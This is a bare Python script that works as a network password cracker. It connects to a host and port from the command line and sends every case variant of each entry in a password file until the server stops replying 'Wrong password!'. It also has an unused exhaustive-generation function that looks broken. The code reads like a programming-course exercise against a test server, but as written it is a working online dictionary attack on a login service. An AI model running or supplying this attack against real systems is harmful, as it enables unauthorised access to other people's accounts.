import socket
import sys
import itertools
import string

hostname = sys.argv[1]
port = int(sys.argv[2])
characters = string.ascii_lowercase + string.digits


def iter_password_from(file_name: str) -> str:
    # `with` handles open/closing file including exception at the end of the file
    # `for` is iterator that can deal with large files
    with open(file_name, 'r') as f:
        for line in f:
            yield line.strip()


# takes `string` and yields its all possible iterations in varying cAsE
def vary_bad_password(bad_pass: str) -> str:
    bad_password = map(''.join, itertools.product(*((c.lower(), c.upper()) for c in bad_pass)))
    for bp in bad_password:
        yield bp


# iteration of all possible lowercase `characters` combinations
def generate_password():
    pas_len = 0
    while True:
        pas_len += 1
        for p in itertools.product(characters, repeat=pas_len):
            yield ''.join(*p)


def main():
    with socket.socket() as client_sock:
        client_sock.connect((hostname, port))
        bad_password_iterator = iter_password_from('passwords.txt')
        while True:
            try:
                bad_pass_from_file = next(bad_password_iterator)
                varied_bad_pass = vary_bad_password(bad_pass_from_file)
                while True:
                    try:
                        password = next(varied_bad_pass).encode()
                        try:
                            client_sock.send(password)
                            response = client_sock.recv(1024).decode()
                            if response == 'Wrong password!':
                                continue
                            else:
                                print(password.decode())
                                break
                        except ConnectionAbortedError:
                            continue
                    except StopIteration:
                        # print('Iteration exhausted')
                        break
            except StopIteration:
                # print('File has ended')
                break


if __name__ == '__main__':
    main()
